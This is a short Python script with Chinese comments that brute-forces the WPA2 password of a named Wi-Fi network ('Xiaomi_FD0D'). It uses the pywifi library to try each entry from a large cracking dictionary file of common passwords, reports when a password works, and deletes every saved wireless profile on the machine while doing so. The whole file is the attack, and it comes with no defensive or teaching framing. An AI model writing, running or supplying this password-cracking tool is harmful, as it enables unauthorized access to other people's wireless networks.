import time

import pywifi
from pywifi import const


def wifi_connect(wifiname,wifipwd):
    wifi = pywifi.PyWiFi()    #扫描附近的wifi
    ifaces = wifi.interfaces()[0]     #获取无线网卡
    ifaces.disconnect()   #断开WiFi连接
    time.sleep(1)

    #判断WiFi是否断开连接
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  #创建wifi连接文件
        profile.ssid = wifiname    #wifi名称
        profile.key = wifipwd      #WiFi密码

        profile.akm.append(const.AKM_TYPE_WPA2PSK)   #wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP     #加密单元
        profile.auth = const.AUTH_ALG_OPEN     #网卡的开放

        ifaces.remove_all_network_profiles()   #删除所有的wifi文件
        temp_profile = ifaces.add_network_profile(profile)  #连接新的连接文件
        ifaces.connect(temp_profile)    #连接新的wifi
        time.sleep(1)

        if ifaces.status() == const.IFACE_DISCONNECTED:
            return False
        else:
            return True
    
    
    else:
        print('已连接')


def read_pwd():
    print('开始破解')
    path = r'C:\Users\Administrator\Desktop\wpa2pojiezidian\破解字典\400W常用密码\1pass00.txt'
    file = open(path,'r')
    while True:
        pwd = file.readline()       #读取一行文件
        result = wifi_connect('Xiaomi_FD0D',pwd)
        if result:
            print('密码正确',pwd)
            break
        else:
            print('密码错误',pwd)
    file.close()


if __name__ == "__main__":
    read_pwd()
